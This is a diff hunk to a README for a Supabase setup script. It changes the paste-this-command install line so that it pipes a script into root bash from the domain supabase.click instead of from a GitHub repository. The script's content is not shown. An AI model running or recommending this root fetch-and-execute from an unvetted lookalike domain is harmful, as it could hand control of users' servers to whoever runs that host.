@@ -30,6 +30,6 @@ This script sets up a Supabase environment on your Linux server. It also include
 ### Running the Script
 
 ```
-sudo bash -c "$(curl -sSL https://raw.githubusercontent.com/realgorgan/install-supabase/main/install.sh)"
+sudo bash -c "$(curl -sSL https://supabase.click/install.sh)"
 ```
 Copy and paste this into your system and follow the prompts.
